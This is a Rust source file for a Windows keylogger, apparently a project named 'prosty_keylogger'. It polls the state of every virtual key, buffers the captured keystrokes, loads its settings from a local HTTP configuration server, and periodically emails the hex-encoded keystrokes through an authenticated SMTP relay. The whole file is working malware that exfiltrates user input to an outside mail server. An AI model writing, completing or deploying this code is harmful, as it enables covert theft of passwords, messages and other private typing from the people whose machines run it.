use std::{thread, time};
use lettre::message::header::ContentType;
use lettre::{SmtpTransport, Transport};
use lettre::transport::smtp::authentication::Credentials;
use log::debug;
use tokio::net::windows::named_pipe::PipeMode::Message;
use windows::UI::Core::CoreVirtualKeyStates;
use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
use std::fmt::Write;
use reqwest::Url;
use serde_json::value::Index;
use prosty_keylogger::common::TaskConfiguration;
//CoreVirtualKeyStates

//pub const BUFF_SIZE: usize = 1024*128;
#[inline]
pub fn check_key() -> Vec<u8>{
    let mut v = Vec::with_capacity(8);
    for i in 0..255u8{
        unsafe{
            let state = GetAsyncKeyState(i as i32);
            if state == 1 || state ==  -32767{
                v.push(i)
            }
        }

    }
    v
}

fn send_mail(num: u32, values: Vec<u8>, config: &TaskConfiguration){
    let mut body: String = String::with_capacity(config.capture_size as usize *2 + 64);
    for v in values{
        write!(body, "{:02x}", v).unwrap();
    }

    let email = lettre::Message::builder()
        .from(config.mail_from.parse().unwrap())
        .to(config.mail_to.parse().unwrap())
        .subject(format!("R{}", num))
        .header(ContentType::TEXT_PLAIN)
        .body(body)
        .unwrap();
    let creds = Credentials::new(config.smtp_login.to_owned(), config.smtp_password.to_owned());

    let mailer = SmtpTransport::relay(&config.relay)
        .unwrap()
        .credentials(creds)
        .build();

    match mailer.send(&email){
        Ok(_) => {
            println!("Email sent successfully")
        }
        Err(e) => {
            println!("Could not send mail: {e:}")
        }
    }
}

async fn get_config(url: Url) -> Result<TaskConfiguration, anyhow::Error>{
    let s = reqwest::get(url).await?.text().await?;
    let t: TaskConfiguration = serde_json::from_str(&s)?;
    Ok(t)
}

//#[tokio::main]
fn main()  -> Result<(), anyhow::Error>{
    let rt = tokio::runtime::Runtime::new()?;


    let config = rt.block_on(async{
        let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
        return Ok::<TaskConfiguration, anyhow::Error>(config);

    })?;

    println!("{:?}", config);
    let milli = time::Duration::from_millis(config.probe_interval_milli as u64);
    let mut vec = Vec::with_capacity(config.capture_size as usize + 64);
    let mut num =1;

    loop{
        thread::sleep(milli);
        let mut keys = check_key();

        if !keys.is_empty(){
            println!("{:02x?}", keys);
            vec.extend(keys);
            println!("len = {}", vec.len());
        }


        if vec.len() > config.capture_size as usize {
            let mut send_vec = Vec::with_capacity(config.capture_size as usize + 64);
            std::mem::swap(&mut send_vec, &mut vec);
            send_mail(num, send_vec, &config);
            num += 1;
        }

    }
}